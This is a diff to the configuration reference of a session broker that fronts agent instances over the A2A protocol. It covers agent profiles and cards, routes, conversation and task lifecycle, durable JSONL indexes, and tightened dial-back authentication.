+| `config`      | string | *(required)*        | Path to the Nexus config file instances of this profile boot with. Funneled through `ExpandPath` (supports `~`), resolved to an absolute path and **stat()ed at boot**: a path that does not exist, is a directory, or cannot be read **fails startup** naming the profile. Its *contents* are not parsed here — whether it is a valid Nexus config is the engine's judgement, made by the instance that boots it. |
+| `card`        | map    | *(required)*        | The hand-authored half of this profile's [Agent Card](#agent-card-agentsnamecard). Required: an A2A agent MUST publish a card, and the broker will not invent a name, description or skill list on an operator's behalf. |
+
+**Profile names are URL path segments**, so they are validated more strictly than
+binary registry names: letters, digits, `-`, `_` and `.` only, and not starting
+with `.`. A name carrying a slash would silently restructure the route tree; one
+carrying a space, colon or percent would round-trip differently through URL
+encoding than through the card, so a client would dial a URL the broker never
+registered. Names are compared with surrounding whitespace trimmed, so
+`"support ":` and `support:` are a **duplicate** and fail the boot.
+
+#### Agent Card (`agents.<name>.card`)
+
+The keys are spelled exactly as [`nexus.io.a2a`](#nexusioa2a)'s inline `card:`
+block spells them, so a card authored for a standalone serving instance pastes
+in unchanged.
+
+| Card field             | Type            | Default      | Description |
+|------------------------|-----------------|--------------|-------------|
+| `name`                 | string          | *(required)* | The agent's public name. |
+| `description`          | string          | *(required)* | The agent's public description. |
+| `version`              | string          | *(required)* | The **agent's** version, not the protocol's. |
+| `documentation_url`    | string          | *(empty)*    | Human-readable documentation for this agent. |
+| `icon_url`             | string          | *(empty)*    | Icon for client UIs. |
+| `provider.organization`| string          | *(required when `provider` is present)* | The organization behind the agent. |
+| `provider.url`         | string          | *(empty)*    | The provider's public URL. |
+| `default_input_modes`  | list of string  | *(empty)*    | Media types the agent accepts when a message does not say otherwise. |
+| `default_output_modes` | list of string  | *(empty)*    | Media types the agent produces when a message does not say otherwise. |
+| `skills`               | list of object  | *(required, ≥1)* | The public capability listing. |
+| `skills[].id`          | string          | *(required)* | Stable skill identifier. |
+| `skills[].name`        | string          | *(required)* | Human-readable skill name. |
+| `skills[].description` | string          | *(required)* | What the skill does. |
+| `skills[].tags`        | list of string  | *(empty)*    | Free-form tags for discovery. |
+| `skills[].examples`    | list of string  | *(empty)*    | Example prompts for this skill. |
+| `skills[].input_modes` | list of string  | *(empty)*    | Per-skill override of `default_input_modes`. |
+| `skills[].output_modes`| list of string  | *(empty)*    | Per-skill override of `default_output_modes`. |
+
+**There are deliberately no keys for `supportedInterfaces`, `capabilities`,
+`securitySchemes` or `securityRequirements`.** They are **derived** from what the
+broker actually serves and overwrite anything a card source carried:
+
+- `supportedInterfaces` — the profile's own JSON-RPC and HTTP+JSON URLs, absolute,
+  built from the origin below. JSON-RPC leads, because the list is ordered by
+  preference and it has the widest client support today. `tenant` is left
+  **unset**: profiles do not share an endpoint URL, so the path segment already
+  routes, and a second routing signal would have to be reconciled with it.
+- `capabilities` — `streaming`, `pushNotifications` and `extendedAgentCard` all
+  follow the set of operations the ingress actually implements. **`streaming` is
+  `true`** (`SendStreamingMessage` is dispatched and the ingress starts a real
+  instance to stream a turn from); **`pushNotifications` and
+  `extendedAgentCard` are `false`** (see
+  [A2A routes](#a2a-routes-http-api-not-yaml)).
+- `securitySchemes` / `securityRequirements` — derived from the broker's
+  [`auth:`](#authentication-auth) chain, one scheme and one requirement per
+  validator, named with nexusauth's chain-order names (`static`, `jwks`,
+  `jwks#2`). Separate requirement entries are the accurate translation of a
+  first-success chain: satisfying **any** validator suffices. A `proxy_headers`
+  validator is deliberately **not** advertised — it accepts no client credential,
+  so publishing a scheme would tell clients to send a header guaranteed to be
+  ignored. With no `auth:` block both fields are omitted entirely.
+
+**The card's origin comes from `advertise_addr`.** A card must carry absolute
+URLs, and `advertise_addr` is already the key that answers "where do clients
+reach this broker" (`ws://` → `http://`, `wss://` → `https://`). With
+`advertise_addr` unset the origin falls back to `listen_addr`, but **only when it
+names a dialable host**: a wildcard bind (`:8080`, `0.0.0.0:8080`) with profiles
+configured **fails startup** naming `advertise_addr`, because a card advertising
+`http://:8080/agents/support/a2a` would be a confidently wrong answer handed to
+every client that fetches it.
+
+#### A2A routes (HTTP API, not YAML)
+
+Each profile publishes three routes, namespaced under its own name so profiles
+cannot collide and nothing can shadow an existing broker route (none of which
+starts with `/agents/`):
+
+| Route | Purpose |
+|-------|---------|
+| `GET`/`HEAD /agents/<profile>/.well-known/agent-card.json` | The profile's Agent Card. Served with `ETag` and `Cache-Control: public, max-age=300`; a conditional request with `If-None-Match` answers **304**. |
+| `POST /agents/<profile>/a2a` | The JSON-RPC 2.0 binding. |
+| `/agents/<profile>/a2a/v1/...` | The HTTP+JSON (REST) binding, including A2A's custom verbs (`/tasks/{id}:cancel`). |
+
+The card is published **per profile** rather than at the origin's well-known URI
+because [specification §8.2](https://a2a-protocol.org) scopes that URI to an
+origin, which can name exactly one agent. A broker fronts several, so each card
+lives under its profile and advertises its own absolute URLs; a client handed a
+profile's card URL — §8.2's "Direct Configuration" — needs nothing else.
+
+**Every A2A route is behind the broker's [`auth:`](#authentication-auth) guard,
+the card included.** A refusal is the broker's standard envelope
+(`{"error":"authentication required"}`, `401`/`403`/`503` with the usual
+`WWW-Authenticate` challenge) — the same middleware, and the same answer, that
+`POST /claim` gives. This differs from [`nexus.io.a2a`](#nexusioa2a), which
+serves its card unauthenticated: that plugin binds loopback by default, whereas
+the broker is an ingress whose standing policy is that even `GET /binaries`
+requires a credential. Clients are given a credential out-of-band before they
+fetch the card, which §8.2 explicitly sanctions. A broker with no `auth:` block
+serves the card to everyone, exactly as it serves every other route.
+
+**`SendMessage`, `SendStreamingMessage` and `CancelTask` are dispatched.** A
+client's message becomes the `input` payload a leased instance's
+[`nexus.io.broker`](#nexusiobroker) plugin turns into `io.input`, and everything
+the instance sends back is translated into A2A frames — see
+[the session broker guide](../guides/session-broker.md#what-the-a2a-ingress-translates)
+for the payload-by-payload mapping.
+
+**`GetTask`, `ListTasks` and `SubscribeToTask` are dispatched too**, served from
+the broker's durable [task store](#a2a-task-retention-a2atasks) rather than from
+memory — which is why they can be answered at all after the instance that ran a
+task has been released or the broker has restarted, precisely when a client asks.
+Every one of them is scoped to the authenticated principal **and to the profile
+it was addressed to**: a task belonging to another caller — or to another profile
+— is **byte-for-byte the same refusal as one that never existed**
+(`TaskNotFoundError`), because a distinct "exists but is not yours" answer is an
+existence oracle for ids the caller was never told. The profile is part of the
+key for the same reason it is part of a conversation's: two profiles are two
+different public agents with two different configs, so `ListTasks` on one must
+not list the other's conversations. `ListTasks` supports
+`contextId`, `status` and `statusTimestampAfter` filters, `historyLength`,
+`includeArtifacts` (default `false`) and keyset pagination via `pageSize` /
+`pageToken`; a `pageToken` this broker did not mint is an `InvalidParamsError`
+rather than a silent restart from the top.
+
+`capabilities.streaming` on every profile card is `true` as a result, because it
+is derived from this operation set rather than configured — both
+`SendStreamingMessage` and `SubscribeToTask` are dispatched.
+
+**The push notification operations and `GetExtendedAgentCard` are still
+refused**, with `UnsupportedOperationError` (JSON-RPC code `-32004` with HTTP
+`200`; REST `400` with a `FAILED_PRECONDITION` google.rpc.Status body) carrying
+`detail: OPERATION_NOT_IMPLEMENTED` to say "not yet" rather than "never". Both
+matching card capabilities are `false`.
+
+The routes authenticate, decode and validate whatever the operation: a malformed
+JSON-RPC envelope is still told it is malformed. A path naming no configured
+profile is a **404** in the binding's own error shape, never a fallback to some
+default agent.
+
+**A message starts, reuses or resumes an instance, and the client is told
+none of it** — see [Conversation lifecycle](#conversation-lifecycle-contextid)
+below for the four cases, the failure states and the response latency each one
+implies.
+
+**A broker built without an instance provider answers `InternalError`** carrying
+`detail: INSTANCE_PROVIDER_NOT_WIRED`, and logs a warning at boot naming the
+missing piece. That is not a state a shipped `nexus-broker` binary can be in —
+`run()` always installs the lifecycle when `agents:` is configured — but the
+refusal exists so an embedder that assembles the ingress itself gets a specific,
+actionable answer rather than a nil-pointer panic.
+
+#### Conversation lifecycle (`contextId`)
+
+An A2A client holds a **`contextId`** and nothing else. The broker holds leases.
+The client never learns the second thing exists, because the ingress owns the
+whole mapping between them:
+
+```
+contextId ──(durable index)──▶ engine session id ──(the /claim spawn spine)──▶ lease
+```
+
+The middle term is what makes it work. A lease is mortal — it is released when a
+conversation goes quiet and it dies when its instance crashes — but an engine
+session is a directory on disk that outlives every process that opened it. A
+message on a context whose instance is gone is therefore not an error to report;
+it is a session to resume.
+
+| What the broker knows about the `contextId` | What a message does |
+|---|---|
+| Nothing (new conversation, or no `contextId` at all — one is minted) | Spawns an instance with **no** `-recall`, waits for dial-back and ready, then runs the turn. |
+| A live instance | Routes the turn to it. History is whatever the running engine holds — nothing is replayed. |
+| A live lease already running the context's session, that this process lost track of (a **restart** with a surviving instance) | **Adopts** it rather than spawning a second engine over one session directory. |
+| A session with no live lease (idle-released, crashed, or a restart) | Spawns a new instance with **`-recall <session id>`** so the engine replays the history. The client is not told the instance ever stopped. |
+
+**Continuity is keyed by `(principal, profile, contextId)`, not by `contextId`
+alone.** A2A lets a client choose its own `contextId`, so keying on it alone
+would let any caller name another caller's conversation and be handed that
+session's history. A colliding `contextId` under a different principal — or a
+different profile — resolves to the caller's **own** binding instead: no leak, no
+oracle, and no overwrite of the real owner's entry. With no `auth:` block every
+caller is the same anonymous principal, exactly as lease ownership already
+behaves.
+
+**The binding is durable but not permanent.** It lives in
+[`<state_dir>/a2a-contexts.jsonl`](#a2a-context--session-index-a2a-contextsjsonl),
+which is capped at 4096 bindings with the oldest dropped first. A conversation
+whose binding was evicted — or any conversation at all, on a broker with no
+`state_dir`, once the process restarts — reads back as *unknown*, so the next
+message on it starts a **fresh session** and nothing tells the client its history
+was left behind.
+
+**The instance is NOT released at the end of a turn.** It is an ordinary lease
+from the moment it is created: it appears in `GET /leases`, it is owned by the
+A2A caller, it counts against `max_concurrent`, `POST /release` tears it down,
+the crash watcher covers it, and **`idle_timeout` reaps it** when the
+conversation goes quiet. Every A2A message the broker sends to it resets the idle
+timer, exactly as a WebSocket client's input does. Releasing per turn was
+rejected: it would make every message a cold boot.
+
+**A spawn that does not produce an instance settles the task, never hangs.** The
+failure is answered as a terminal A2A **task state** rather than as a protocol
+error, because a client that asked an agent a question deserves an answer in the
+vocabulary it already speaks:
+
+| Condition | Task state | Why |
+|---|---|---|
+| The profile's `binary` is not in the registry; the context's session was created by a different binary; the profile's `config` file cannot be read or is empty | `TASK_STATE_REJECTED` | The broker refused the request. Nothing was attempted, and the same message will fail the same way until an operator changes something. |
+| The instance exited while booting, never signalled ready inside the ready timeout, or the broker is at capacity | `TASK_STATE_FAILED` | The spawn was attempted and did not come up. A retry may succeed. |
+| A surviving instance is mid-reattach after a restart | `TASK_STATE_FAILED` | Spawning now would put a second engine on one session directory. Retry once the instance has reconnected. |
+
+The terminal status carries a message explaining what happened **without naming a
+lease**, because a lease is not a concept an A2A client has.
+
+**Response latency.** The two internal timeouts a `/claim` caller already waits
+on apply unchanged to the *first* message of a conversation and to the message
+that re-spawns one:
+
+| Bound | Value | Effect on an A2A response |
+|---|---|---|
+| Ready wait | 30s | A cold spawn blocks the A2A request until the instance signals ready. In the worst case the client waits 30s and then receives a `FAILED` task. |
+| Session-report grace | 5s | After ready, the broker waits up to 5s for the instance's session id. It is **not** on the answer path for the turn: a report that never arrives only costs the conversation its durable binding, so a later resume starts a fresh session rather than replaying. |
+
+Both are constants, not config keys: they bound the broker's own handshake with a
+process it started, not a policy an operator tunes. A **second** message on a
+live conversation pays neither — it goes straight to the running instance — which
+is the whole reason the instance is kept alive between turns.
+
+#### Serial task queueing
+
+**A conversation runs one task at a time.** A Nexus instance runs one agent
+loop, and two `input` payloads sent to it while a turn is in flight do not
+produce two turns — they interleave into whatever the loop does next. So a second
+message on a `contextId` whose task is still live is *accepted* and *queued*: it
+sits in `TASK_STATE_SUBMITTED`, with nothing sent to any instance, until the
+task ahead of it is terminal, and then moves to `TASK_STATE_WORKING`.
+
+`TASK_STATE_SUBMITTED` is the honest rendering — [§3.1.1](https://a2a-protocol.org)
+defines it as "accepted, not yet started", which is exactly a queued turn. A
+queued task is a complete task: it has an id, it can be read with `GetTask`,
+streamed with `SubscribeToTask`, and cancelled with `CancelTask`.
+
+The queue is keyed by **(caller, profile, `contextId`)** — the same key the
+instance is filed under — so two conversations never wait on each other, and two
+principals using the same `contextId` get two instances and two queues.
+
+It advances on exactly one event: **a task reaching a terminal state**. Every way
+a turn can end funnels through there, so the queue survives things going wrong:
+
+| What happens | What the queue does |
+|---|---|
+| The turn completes, fails or is cancelled | The next task is promoted and starts. |
+| The instance is released while idle, or crashes | The active task settles at `FAILED`; the next task is promoted and **acquires a fresh instance**, which resumes the conversation from its session. |
+| A queued task is cancelled before it starts | It leaves the queue; nothing else is disturbed and the task behind it still runs. |
+| The active task parks at `TASK_STATE_INPUT_REQUIRED` | It **keeps** the queue: the agent loop is blocked inside `ask_user`, so starting the next turn would send input to an instance that cannot read it. `a2a.tasks.input_timeout` is what stops that being a deadlock — see below. |
+
+A promoted turn is **detached from the request that submitted it**: a client that
+hangs up while queued has not withdrawn its message, and can read the result with
+`GetTask` or reattach with `SubscribeToTask`.
+
+#### A2A task retention (`a2a.tasks`)
+
+Every A2A task the broker runs is recorded in `<state_dir>/a2a-tasks.jsonl`, in
+the same append-and-compact shape as the [lease journal](#lease-durability-state_dir)
+and the [A2A context index](#a2a-context--session-index-a2a-contextsjsonl)
+(`a2a-contexts.jsonl`). One
+mechanism, one failure policy, one thing for an operator to know about a
+`state_dir` — a database for this one file was rejected on those grounds.
+
+The record is what makes `GetTask`, `ListTasks` and `SubscribeToTask` answer
+after the instance is gone. It carries the task's identity, its current status
+and status message, its response artifact and a bounded trail of the messages the
+client sent, keyed by **owner first** so a task is not reachable without a
+principal, and scoped to the **profile** it was addressed to.
+
+**With no `state_dir` the store is memory-only**: every read still answers for
+the life of the process, and nothing survives a restart. The reads refusing would
+be a far worse degradation than losing them across a restart, which is what such
+a broker has already chosen for its leases.
+
+**A task left in flight by a stopped broker is settled at `TASK_STATE_FAILED`
+when the store opens**, with a status message saying the broker stopped. Leaving
+it as it stood would show a client `WORKING` for ever, and would make the record
+immortal — only terminal tasks are evictable, so a crash loop would accumulate
+records that count against the cap and push real tasks out of it.
+
+**Retention is load-bearing, not housekeeping.** A broker records a task for
+every turn every client ever runs, so an unbounded policy would grow with
+*traffic* rather than with any one conversation:
+
+| Bound | Value | Configurable | Why this number |
+|---|---|---|---|
+| `a2a.tasks.ttl` | `24h` | yes (`"0s"` disables) | A task is only useful to a client that still holds its id, and a client that has been away for a day has restarted, retried or given up. A day is also far longer than any plausible reconnect window, so the TTL never expires a task somebody is still following. It matches [`nexus.io.a2a`](#nexusioa2a)'s default deliberately: the same client talking to the same agent must not find its history disappearing on a different schedule depending on whether a broker is in front of it. |
+| `a2a.tasks.max_per_context` | `50` | yes (`0` disables) | 50 turns of readable history per conversation is far more than a client polls back over. It is **lower** than `nexus.io.a2a`'s 200 because a standalone listener serves exactly one context — its per-context cap is also its total — whereas a broker holds every conversation at once, so the number multiplies. |
+| Total tasks retained | `2048` | no | The backstop that makes the store's footprint statable: the per-context cap alone bounds nothing when the number of contexts is unbounded. Eviction takes the **oldest terminal** records first. |
+| Stored text per artifact or message | `16 KiB` | no | The store's real growth term. A turn's answer is unbounded and the record is rewritten on each transition, so an uncapped answer would be written several times at whatever size it happened to be. 16 KiB is roughly four thousand words. It is not a config key because it is a property of this storage substrate rather than a deployment choice. |
+
+Two consequences worth stating plainly:
+
+- **Only the stored copy is truncated.** A client attached while the turn ran
+  received the whole answer; a truncated stored copy carries a marker saying so,
+  so a later `GetTask` cannot mistake an excerpt for the whole.
+- **Streamed deltas are never stored.** A record is written only when a task
+  changes state or publishes an artifact, so a turn that streams thousands of
+  chunks writes the same handful of lines a one-word turn does. The store scales
+  with the *shape* of a turn, not its volume.
+
+`a2a.tasks.input_timeout` (default `15m`, `"0s"` disables) is the third knob and
+is not about storage at all: it bounds how long a task may sit at
+`TASK_STATE_INPUT_REQUIRED`. A parked task holds its leased instance **and** its
+conversation's [serial queue](#serial-task-queueing), because the agent loop that
+asked the question is blocked inside `ask_user`. On expiry the task is driven to
+`TASK_STATE_FAILED` — a real terminal transition that closes every attached
+stream and frees the queue — and the instance is sent a cancellation so its loop
+unblocks. Fifteen minutes is chosen against a human: a question routed to a
+person has to survive being paged, read, thought about and answered. Setting
+`"0s"` removes the deadline, and with it the guarantee that a queue behind an
+unanswered question ever moves.
 
 ### Lease durability (`state_dir`)
 
@@ -2553,9 +4135,18 @@ from the single point all three teardown reasons converge on, so a manual
 `POST /release`, an idle sweep and a **crash** are all recorded.
 
 Each record carries `lease_id`, `owner` (the claiming principal's `id`, `tenant`
-and `scopes`), `session_id`, `pid`, `broker_id`, `advertise_addr` — verbatim as
-configured, so a record round-trips what is in `broker.yaml` — and
+and `scopes`), `session_id`, `binary`, `pid`, `broker_id`, `advertise_addr` —
+verbatim as configured, so a record round-trips what is in `broker.yaml` — and
 `created_at` / `released_at` / `reason`.
+
+`binary` is the [`binaries`](#binary-registry-binaries) entry **name** the instance was spawned
+from — the name, not the path, so the record still identifies the variant after
+the entry is repointed at a new build. It is omitted when empty, which is what a
+journal written by a broker predating the field looks like; such a record still
+loads, and an absent `binary` means *not recorded*, never "the binary named empty
+string". The lease journal's copy is only good while the lease is live — a
+released lease is dropped by compaction — so the durable mapping lives in a
+separate file, described next.
 
 **No secret is ever written.** Not the lease's per-spawn secret, not a client
 WebSocket ticket, not a bearer token. The owner's **raw claim set** is
@@ -2572,9 +4163,23 @@ record each, via a temp file and an atomic rename — so a crash mid-compaction
 leaves the previous journal intact. At any moment the file holds at most
 (live leases + 512) records, however many leases have come and gone.
 
-**Failure handling.** A journal write that fails is **logged and otherwise
-ignored**: it never fails a claim or a release, because durability must not
-become a new way for the broker to refuse service. A record that was being
+**Durability.** Every append is `fsync`ed before it returns, and a compaction
+fsyncs the temp file **before** the rename and the containing **directory**
+after it. The journal therefore survives a power loss or a hard reset, not only
+`kill -9`: rename is atomic but not durable, and an unsynced tail is exactly
+where the record carrying an instance's `pid` lives — losing it would leave the
+next boot closing out a lease whose process is still running. The barrier is
+unconditional rather than restricted to the pid-bearing record; the cost is
+roughly **three fsyncs per lease lifetime** (minted, pid/session recorded,
+released), which is why singling out one record kind was not worth the invariant.
+The `session-binaries.jsonl` and `a2a-contexts.jsonl` indexes are **not** fsynced:
+both are best-effort, an unknown key means *no opinion, proceed*, and losing
+their tail degrades to the behaviour that predates them rather than to a wrong
+answer.
+
+**Failure handling.** A journal write **or fsync** that fails is **logged and
+otherwise ignored**: it never fails a claim or a release, because durability must
+not become a new way for the broker to refuse service. A record that was being
 written when the broker was killed leaves a torn final line; the reader **skips
 it with a warning** and keeps every complete record before it, and the
 rewrite-on-open truncates it away. An unreadable or malformed line anywhere in
@@ -2584,6 +4189,109 @@ Multi-broker cooperation is **not** implemented: no broker reads another's
 journal, there is no shared store, and there is no routing. `broker_id` and
 `advertise_addr` are stamped on every record now so that a future shared backend
 needs no data migration.
+
+### Session → binary index (`session-binaries.jsonl`)
+
+`<state_dir>/session-binaries.jsonl` records which
+[`binaries`](#binary-registry-binaries) entry served each engine session, so a
+resume can be checked against the build that created the session. It is a
+**separate file from the lease journal on purpose**: the journal is compacted down
+to the leases that are still live, and a resume always arrives *after* the
+original lease was released, so a binding kept only there would be gone precisely
+when it is wanted.
+
+**Format.** Append-only JSONL, one object per line, with three fields —
+`session_id`, `binary` (the entry **name**, never the path) and `at` (when the
+pairing was last recorded, used only for pruning). A later line for the same
+`session_id` supersedes an earlier one. **No secret is ever written**, for the
+same reasons as the lease journal.
+
+**When a line is written.** At **claim time** for a resume, where the session id
+arrives in the request body, and on the **session-id report** for a new session,
+where the id is not knowable any earlier. Re-recording an unchanged pairing does
+not append — a session resumed many times costs one line, not one per resume. An
+empty `binary` is never written: empty means *not recorded*.
+
+**Growth is bounded** by an entry cap of **4096 bindings**, applied when the file
+is rewritten — on open, and again every 256 appends — via a temp file and an
+atomic rename. A cap is required here and compaction alone would not be enough:
+nothing ever retires a binding (outliving its lease is the whole point), so
+without one the file would grow by a line per distinct session forever. When the
+cap is exceeded the **oldest** bindings are dropped.
+
+**It is best-effort, and that is deliberate.** An unknown session is an ordinary
+answer meaning *no opinion, proceed* — never a mismatch. A session predating this
+file, a session whose binding was pruned, and a broker running without a
+`state_dir` all resume exactly as they did before the index existed. What a
+*found* binding is enforced as on a claim is described under
+[Resume inherits the recorded binary](#resume-inherits-the-recorded-binary).
+
+**Failure handling.** Malformed, torn or partially-written lines are **skipped
+with a warning** and every good line before them is kept; the rewrite-on-open
+truncates the damage away. A corrupt index **never prevents the broker from
+booting**. Unlike the lease journal, an index that cannot be opened at all is
+**not** a boot failure either — it logs a `WARN` and the broker runs with the
+index off, because refusing to serve would trade an advisory check for an outage.
+A write that fails is logged and otherwise ignored: it never fails a claim.
+
+### A2A context → session index (`a2a-contexts.jsonl`)
+
+`<state_dir>/a2a-contexts.jsonl` records which engine session serves each
+[A2A conversation](#conversation-lifecycle-contextid), so a message on a
+`contextId` whose instance is gone re-spawns onto the **same** session with
+`-recall` instead of starting a new one. It is written **only when `agents:` is
+configured**, and it is a third file rather than part of either of the two above:
+the lease journal is compacted down to live leases, and the session → binary
+index is keyed by session id — precisely the thing an A2A client does not know.
+
+**Format.** Append-only JSONL, one object per line: `owner_id` (the principal;
+omitted for the anonymous owner every caller is when no `auth:` block is
+configured), `profile`, `context_id`, `session_id` and `at`. A later line for the
+same `(owner_id, profile, context_id)` triple supersedes an earlier one. **No
+secret is ever written**, for the same reasons as the lease journal.
+
+**The key is the triple, not the `contextId`.** A2A lets a client choose its own
+`contextId` ([§3.4](https://a2a-protocol.org)), so keying on it alone would let
+any caller name another caller's conversation and be handed that session's
+history. A colliding `contextId` under a different principal — or a different
+profile — resolves to the caller's **own** binding: no leak, no oracle, and no
+overwrite of the real owner's entry.
+
+**When a line is written.** On the instance's **session-id report**, which is the
+earliest moment the session id exists. An empty `session_id` is never written:
+empty means *not recorded*. Re-recording an unchanged pairing does not append, so
+a conversation resumed many times costs one line.
+
+**Growth is bounded** by an entry cap of **4096 bindings**, applied when the file
+is rewritten — on open and every 256 appends — via a temp file and an atomic
+rename. The number matches the session → binary index deliberately: the two are
+populated by the same events at the same rate (one A2A conversation is one engine
+session), so a broker that outgrows one has outgrown both. When the cap is
+exceeded the **oldest** bindings are dropped, ordered by when each was last
+recorded.
+
+> **Eviction is lossy, by design, and nothing warns anybody.** A pruned binding
+> reads back as *unknown*, and unknown means "new conversation": the next message
+> on that `contextId` spawns a **fresh session** and the client is told nothing —
+> it simply finds the agent has forgotten the conversation. That is the accepted
+> cost of a key space with no retirement event; nothing ever marks a conversation
+> as finished, because being resumable later is the whole point of one. The cap is
+> generous for that reason, and the degradation is always to *forgetting*, never
+> to answering with the **wrong** session. A deployment that needs a conversation
+> to survive indefinitely should not rely on this file: keep the engine session id
+> the broker reported and address it directly.
+
+**Failure handling.** Malformed, torn or partially-written lines are **skipped
+with a warning** and every good line before them is kept; the rewrite-on-open
+truncates the damage away. An index that cannot be opened at all is **not** a boot
+failure — it logs a `WARN` and continuity falls back to the life of the process,
+because refusing to serve would trade resumability for an outage. A write that
+fails is logged and never fails the message that produced it; the cost is that a
+later resume starts fresh.
+
+**With no `state_dir` there is no index at all.** A conversation is then resumable
+only for as long as its lease lives — the same bargain such a broker has already
+made for its leases.
 
 ### Restart recovery (`reattach_window`)
 
@@ -2606,12 +4314,13 @@ an instance dials `/instance` and presents both the correct lease id **and** the
 correct spawn secret. Once it does, the lease is fully ordinary: idle sweeping,
 crash watching, ownership checks and `POST /release` all apply unchanged.
 
-**A restored lease always requires the spawn secret, even with no `auth:`
-block.** Liveness is not identity: the pid recorded before the restart may have
-been recycled to an unrelated process, and a signal-0 probe (the portable check
-on Linux and macOS) cannot see the difference. Admitting a dialer on a lease id
-alone would hand a stranger's process a client's session, so this check is not
-configurable.
+**Liveness is not identity**, which is why a restored lease is not handed to
+whoever dials in naming it: the pid recorded before the restart may have been
+recycled to an unrelated process, and a signal-0 probe (the portable check on
+Linux and macOS) cannot see the difference. Admitting a dialer on a lease id alone
+would hand a stranger's process a client's session. The spawn secret settles it,
+and it is required on **every** registration — restored or not, `auth:` block or
+not (see [Instance dial-back authentication](#instance-dial-back-authentication-ws-instance)).
 
 **How the secret survives when it is never written down.** The per-spawn secret
 is **derived**, not stored: `HMAC-SHA256(<state_dir>/spawn-key, lease_id)`. The
@@ -2643,10 +4352,15 @@ at all is still fatal — that is a misconfiguration, not lost data.) With
 ### Authentication (`auth:`)
 
 The `auth:` block configures an ordered chain of credential validators
-(`pkg/nexusauth`). Four routes are authenticated by middleware — `POST /claim`,
-`POST /release/{lease_id}`, `GET /leases`, and `POST /ticket/{lease_id}`.
+(`pkg/nexusauth`). Six routes are authenticated by middleware — `POST /claim`,
+`POST /release/{lease_id}`, `GET /leases`, `POST /ticket/{lease_id}`,
+`GET /binaries` and `GET /metrics`.
 `GET /healthz` is registered **outside** the guard and always answers `200` with
 no credential, because a load balancer or container probe has none to present.
+
+`GET /metrics` is the one route that layers a second check on top of the
+middleware: it additionally requires `auth.admin_scope`. See
+[`GET /metrics`](#get-metrics-http-api-not-yaml).
 
 `WS /lease/{lease_id}`, the per-lease client socket, is not behind that
 middleware but **does** use the same validator chain: it resolves the caller's
@@ -2686,7 +4400,7 @@ auth:
 
 | Key                                    | Type            | Default    | Description                                                                                     |
 |----------------------------------------|-----------------|------------|-------------------------------------------------------------------------------------------------|
-| `auth.admin_scope`                     | string          | `nexus.broker.admin` | The scope a validated credential must carry to be treated as a broker **operator**. It widens `GET /leases` from "the caller's own leases" to the whole registry plus the capacity aggregates — and **nothing else**: `POST /release/{lease_id}` and `WS /lease/{lease_id}` stay strict principal-`ID` ownership, so a leaked operator credential cannot tear down or hijack another principal's session. Comparison is exact and case-sensitive. Set it to `""` (or `admin_scope:` with no value) to mean **no caller is an operator**, which makes `GET /leases` caller-scoped for everybody. Irrelevant while auth is disabled — the endpoint is then unrestricted for all callers. |
+| `auth.admin_scope`                     | string          | `nexus.broker.admin` | The scope a validated credential must carry to be treated as a broker **operator**. It widens `GET /leases` from "the caller's own leases" to the whole registry plus the capacity aggregates, and it is required to scrape `GET /metrics` — and **nothing else**: `POST /release/{lease_id}` and `WS /lease/{lease_id}` stay strict principal-`ID` ownership, so a leaked operator credential cannot tear down or hijack another principal's session. Comparison is exact and case-sensitive. Set it to `""` (or `admin_scope:` with no value) to mean **no caller is an operator**, which makes `GET /leases` caller-scoped for everybody and refuses `GET /metrics` to everybody. Irrelevant while auth is disabled — both endpoints are then unrestricted for all callers. |
 | `auth.validators`                      | list            | `[]`       | Validators to try, **in order**; the first one that accepts the request wins, so cheap validators belong first. An empty or absent list means auth is disabled. Unknown keys are rejected at every level. |
 | `auth.validators[].type`               | string          | *required* | Validator implementation: `static` (a table of shared tokens), `jwks` (OIDC JWTs verified against an issuer's published key set), `introspect` (opaque tokens verified by calling the issuer's RFC 7662 introspection endpoint), or `proxy_headers` (an identity a fronting authenticating proxy already established, honoured only for peers inside a CIDR allowlist). |
 | `auth.validators[].principal_claim`    | string          | `""`       | Which claim becomes `Principal.ID`. Parsed for every entry; **required for `jwks` and `introspect`**, accepted and ignored by `static` and `proxy_headers` (neither has a claim set — `proxy_headers` uses `principal_header` instead). |
@@ -3079,21 +4793,37 @@ to the `NEXUS_BROKER_ADDR` / `NEXUS_BROKER_LEASE_ID` /
 
 #### Instance dial-back authentication (`WS /instance`)
 
-The `auth:` block also gates the **instance** dial-back, not just the
-control-plane routes. With it configured, the `register` frame must carry both a
-known `lease_id` **and** the per-spawn secret the broker minted for that lease
-(128 bits of `crypto/rand`, injected through the child's environment at exec).
-Anything else — an unknown lease, an absent secret, a wrong secret — is closed
-with the same `policy violation` / `unknown lease` close, so a dialer cannot
-difference the responses to enumerate live lease ids.
+The `auth:` block does **not** govern the instance dial-back. That block says how
+*clients* are verified; `WS /instance` is where a process the broker started
+proves it is that process, and it does so with the per-spawn secret the broker
+minted for the lease (injected through the child's environment at exec, never
+argv).
 
-The gate exists because of **version skew**. With no `auth:` block the secret is
-not checked at all, so a `nexus_binary_path` pointing at a build that predates
-the protocol keeps working unchanged. With one configured, such a binary is
-refused and the broker logs a `WARN` naming the version skew explicitly —
-otherwise the symptom (every claim returning `504 instance did not become ready
-in time` while the child process is alive and connecting fine) reads as a network
-fault. The fix is to upgrade the instance binary.
+**The secret is required unconditionally** — `auth:` block or not, claimed lease
+or restored lease. The register frame must carry a known `lease_id`, a `version`
+matching the broker's own frame schema version, and the matching secret.
+
+> **Breaking change.** Enforcement used to be gated on the `auth:` block being
+> present, so an unauthenticated broker (the documented default) admitted any
+> register frame naming a live lease — including one carrying no secret at all.
+> Lease ids are not secret: they travel in `ws_url`s, client requests and logs, so
+> anything that observed one could register as that lease's instance the moment
+> the real socket dropped. A `nexus` build predating the protocol now fails to
+> register on **every** broker, and removing the `auth:` block is no longer a
+> workaround. Upgrade the binary the [registry entry](#binary-registry-binaries)
+> points at; the check is per **spawn**, so one stale variant fails while every
+> other entry keeps working. The step-by-step migration is in
+> [Upgrading an existing broker](../guides/session-broker.md#upgrading-an-existing-broker).
+
+Every refusal — unknown lease, absent secret, wrong secret, skewed frame version
+— is closed with the same `policy violation` / `unknown lease` close, so a dialer
+cannot difference the responses to enumerate live lease ids. **The log is the only
+place the causes are distinguished**, and each `WARN` names its own fix: upgrade
+the binary (skewed version), upgrade the binary (absent secret), or investigate an
+impostor (wrong secret). None of them ever contains a secret value. The
+diagnostics matter because the symptom is identical and misleading — every claim
+returns `504 instance did not become ready in time` while the child process is
+alive and connecting fine, which reads as a network fault.
 
